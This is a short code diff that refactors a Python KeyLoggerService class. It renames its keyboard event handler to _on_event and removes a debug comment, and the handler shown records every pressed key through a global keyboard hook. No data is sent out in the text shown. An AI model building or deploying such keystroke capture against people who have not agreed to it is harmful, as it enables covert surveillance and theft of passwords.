@@ -7,8 +7,7 @@ class KeyLoggerService(AbstractKeyLoggerService):
         super().__init__()
         self.flag = False
 
-    def on_event(self, event):
-        # print(vars(event))
+    def _on_event(self, event):
         if event.event_type == keyboard.KEY_DOWN:
             key = event.name
             if len(key)> 1:
@@ -20,7 +19,7 @@ class KeyLoggerService(AbstractKeyLoggerService):
             self.keys.append(key)
 
     def start_logging(self)-> None:
-        keyboard.hook(self.on_event)
+        keyboard.hook(self._on_event)
 
     def stop_logging(self):
         keyboard.unhook_all()
